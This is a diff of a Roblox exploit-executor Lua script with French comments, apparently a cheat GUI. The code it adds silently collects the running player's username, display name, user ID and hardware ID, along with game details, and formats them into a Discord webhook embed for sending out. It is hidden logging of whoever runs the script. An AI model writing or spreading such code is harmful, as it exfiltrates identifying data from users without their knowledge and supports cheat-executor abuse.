@@ -35,7 +35,7 @@ end
 
 -- Scripts:
 
-local function TXQTO_fake_script()
+local function VOFXB_fake_script()
 	local script = Instance.new('LocalScript')
 	script.Name = [[LocalScript]]
 	script.Parent = _i[1]
@@ -45,17 +45,22 @@ local function TXQTO_fake_script()
 	local HttpService = game:GetService("HttpService")
 	local MarketplaceService = game:GetService("MarketplaceService")
 	
-	-- 1. DÉTECTION DE L'EXÉCUTEUR
+	-- ==========================================
+	-- 1. DÉTECTION EXÉCUTEUR & HWID
+	-- ==========================================
 	local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 	local executorName = identifyexecutor and identifyexecutor() or "Exécuteur Inconnu"
-
-local hwid = "Non supporté par l'exécuteur"
-task.spawn(function()
-	pcall(function() hwid = gethwid and gethwid() or get_hwid and get_hwid() or get_hardware_id and get_hardware_id() or hwid end)
-end)
-
 	
-	-- 2. FONCTION POUR RÉCUPÉRER L'IMAGE DU JOUEUR
+	local hwid = "Non supporté par l'exécuteur"
+	task.spawn(function()
+		pcall(function() hwid = gethwid and gethwid() or get_hwid and get_hwid() or get_hardware_id and get_hardware_id() or hwid end)
+	end)
+	
+	
+	 
+	-- ==========================================
+	-- 2. FONCTION WEBHOOK DISCORD (LOGGING COMPLET)
+	-- ==========================================
 	local function GetRealHeadShotAPI(userId)
 		local fallbackImage = "https://tr.rbxcdn.com/53eb9b17fe1432a809c73a132d79f09c/420/420/Image/Png"
 		if not httpRequest then return fallbackImage end
@@ -119,10 +124,10 @@ end)
 					},
 					["fields"] = {
 						-- Infos Joueur
-						{["name"] = "👤 Pseudo", ["value"] = LocalPlayer.Name, ["inline"] = true},
-						{["name"] = "🏷️ Surnom", ["value"] = LocalPlayer.DisplayName, ["inline"] = true},
-						{["name"] = "🆔 ID Joueur", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
-						{["name"] = "💻 HWID (Machine ID)", ["value"] = "`" .. hwid .. "`", ["inline"] = false}
+						{["name"] = "👤 Pseudo", ["value"] = "``" .. LocalPlayer.Name .. "``", ["inline"] = true},
+						{["name"] = "🏷️ Surnom", ["value"] = "``" .. LocalPlayer.DisplayName .. "``", ["inline"] = true},
+						{["name"] = "🆔 ID Joueur", ["value"] = "``" .. tostring(LocalPlayer.UserId) .. "``", ["inline"] = true},
+						{["name"] = "💻 HWID (Machine ID)", ["value"] = "``" .. hwid .. "``", ["inline"] = false},
 	
 						-- Infos Jeu
 						{["name"] = "🎮 Jeu Actuel", ["value"] = gameName, ["inline"] = true},
@@ -154,7 +159,7 @@ end)
 	
 	
 end
-coroutine.wrap(TXQTO_fake_script)()
+coroutine.wrap(VOFXB_fake_script)()
 
 
 _i[1].Parent = PlayerGui
